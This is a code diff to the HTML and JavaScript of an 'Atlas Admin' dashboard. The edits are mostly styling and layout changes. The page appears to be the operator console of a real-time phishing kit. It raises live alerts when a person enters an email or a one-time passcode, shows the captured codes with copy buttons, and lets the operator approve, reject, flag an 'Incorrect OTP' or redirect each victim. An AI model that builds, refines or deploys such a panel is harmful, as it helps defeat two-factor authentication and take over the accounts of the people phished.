@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Atlas Admin Dashboard</title>
+  <title>Atlas Admin</title>
   <style>
     * { margin: 0; padding: 0; box-sizing: border-box; }
     body {
@@ -28,6 +28,7 @@
       border: 1px solid #3a3a4a;
       border-radius: 12px;
       color: white;
+      font-size: 16px;
     }
     .login-box button {
       width: 100%;
@@ -38,14 +39,17 @@
       color: white;
       font-weight: bold;
       cursor: pointer;
+      font-size: 16px;
     }
     .dashboard { display: none; }
     h1 { margin-bottom: 24px; }
+    .table-wrapper { overflow-x: auto; }
     table {
       width: 100%;
       background: #1e1e2f;
       border-radius: 16px;
       overflow: hidden;
+      border-collapse: collapse;
     }
     th, td {
       padding: 14px;
@@ -60,27 +64,27 @@
       border-radius: 8px;
       cursor: pointer;
       font-size: 12px;
+      font-weight: 500;
     }
     .approve { background: #00c853; color: white; }
     .reject { background: #d32f2f; color: white; }
     .incorrect { background: #ff9800; color: white; }
     .redirect { background: #2196f3; color: white; }
     .copy { background: #555; color: white; }
-    .notification-badge {
-      position: fixed;
-      top: 20px;
-      right: 20px;
-      background: #d32f2f;
-      padding: 8px 16px;
-      border-radius: 20px;
-      font-size: 12px;
+
+    @media (max-width: 768px) {
+      body { padding: 12px; }
+      th, td { padding: 10px 8px; font-size: 12px; }
+      button.small { padding: 4px 8px; font-size: 10px; margin: 2px; }
+      .table-wrapper { overflow-x: auto; }
+      table { min-width: 600px; }
     }
   </style>
 </head>
 <body>
 <div class="container">
   <div id="loginPanel" class="login-box">
-    <h2>🔐 Admin Login</h2>
+    <h2>Admin Login</h2>
     <input type="email" id="adminEmail" placeholder="Email" />
     <input type="password" id="adminPassword" placeholder="Password" />
     <button onclick="login()">Login</button>
@@ -88,17 +92,18 @@
   </div>
   
   <div id="dashboard" class="dashboard">
-    <h1>👑 Atlas Admin Dashboard</h1>
+    <h1>Atlas Admin Dashboard</h1>
     <div style="margin-bottom: 20px;">
-      <span>🔔 Sound notifications: ON</span>
-      <button onclick="requestNotificationPermission()" style="margin-left: 12px;">Enable Notifications</button>
+      <button onclick="requestNotificationPermission()" style="background: #4a4ff0; color: white; padding: 10px 20px; border: none; border-radius: 12px; cursor: pointer;">Enable Notifications</button>
     </div>
-    <table id="usersTable">
-      <thead>
-        <tr><th>ID</th><th>Email</th><th>OTP Code</th><th>Status</th><th>Actions</th></tr>
-      </thead>
-      <tbody id="tableBody"></tbody>
-    </table>
+    <div class="table-wrapper">
+      <table id="usersTable">
+        <thead>
+          <tr><th>ID</th><th>Email</th><th>OTP Code</th><th>Status</th><th>Actions</th></tr>
+        </thead>
+        <tbody id="tableBody"></tbody>
+      </table>
+    </div>
   </div>
 </div>
 
@@ -106,31 +111,28 @@
 <script>
   let socket = null;
   let isLoggedIn = false;
-  
+
   function playSound(type) {
     const audio = new Audio(`/sounds/${type}.mp3`);
     audio.play().catch(e => console.log('Sound error:', e));
   }
-  
+
   function requestNotificationPermission() {
     if (Notification.permission !== 'granted') {
       Notification.requestPermission();
     }
   }
-  
+
   function showNotification(title, body) {
     if (Notification.permission === 'granted') {
-      new Notification(title, { body, icon: '/logo.png' });
+      new Notification(title, { body });
     }
   }
-  
+
   async function login() {
     const email = document.getElementById('adminEmail').value;
     const password = document.getElementById('adminPassword').value;
-    const expectedEmail = '<? echo getenv("ADMIN_EMAIL") ?>'; // replaced by backend later
-    const expectedPass = '<? echo getenv("ADMIN_PASSWORD") ?>';
     
-    // Simple check - in real world, backend should validate
     const res = await fetch('/api/admin/check', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
@@ -146,7 +148,7 @@
       document.getElementById('loginError').innerText = 'Invalid credentials';
     }
   }
-  
+
   async function initAdmin() {
     socket = io();
     socket.emit('admin-join');
@@ -156,17 +158,17 @@
     
     socket.on('new-email', (data) => {
       playSound('email');
-      showNotification('New Email Received', `${data.email} just signed up`);
+      showNotification('New Email', `${data.email} just signed up`);
       loadUsers();
     });
     
     socket.on('new-otp', (data) => {
       playSound('otp');
-      showNotification('New OTP Submitted', `${data.email} entered OTP: ${data.otp}`);
+      showNotification('New OTP', `${data.email} entered: ${data.otp}`);
       loadUsers();
     });
   }
-  
+
   async function loadUsers() {
     const res = await fetch('/api/users');
     const users = await res.json();
@@ -175,34 +177,33 @@
     users.forEach(user => {
       const row = tbody.insertRow();
       row.insertCell(0).innerText = user.id;
-      row.insertCell(1).innerHTML = `${user.email} <button class="small copy" onclick="copyToClipboard('${user.email}')">📋 Copy</button>`;
-      row.insertCell(2).innerHTML = user.otp_code ? `${user.otp_code} <button class="small copy" onclick="copyToClipboard('${user.otp_code}')">📋 Copy</button>` : '—';
+      row.insertCell(1).innerHTML = `${user.email} <button class="small copy" onclick="copyToClipboard('${user.email}')">Copy</button>`;
+      row.insertCell(2).innerHTML = user.otp_code ? `${user.otp_code} <button class="small copy" onclick="copyToClipboard('${user.otp_code}')">Copy</button>` : '—';
       row.insertCell(3).innerText = user.status;
       const actions = row.insertCell(4);
       actions.innerHTML = `
-        <button class="small approve" onclick="action('approve', '${user.email}')">✅ Approve</button>
-        <button class="small reject" onclick="action('reject', '${user.email}')">❌ Reject</button>
-        <button class="small incorrect" onclick="action('incorrect', '${user.email}')">⚠️ Incorrect OTP</button>
-        <button class="small redirect" onclick="action('redirect', '${user.email}')">➡️ Redirect</button>
+        <button class="small approve" onclick="action('approve', '${user.email}')">Approve</button>
+        <button class="small reject" onclick="action('reject', '${user.email}')">Reject</button>
+        <button class="small incorrect" onclick="action('incorrect', '${user.email}')">Incorrect OTP</button>
+        <button class="small redirect" onclick="action('redirect', '${user.email}')">Redirect</button>
       `;
     });
   }
-  
+
   async function action(type, email) {
-    const endpoint = `/api/admin/${type}`;
-    await fetch(endpoint, {
+    await fetch(`/api/admin/${type}`, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({ email })
     });
     loadUsers();
   }
-  
+
   function copyToClipboard(text) {
     navigator.clipboard.writeText(text);
     alert('Copied: ' + text);
   }
-  
+
   requestNotificationPermission();
 </script>
 </body>
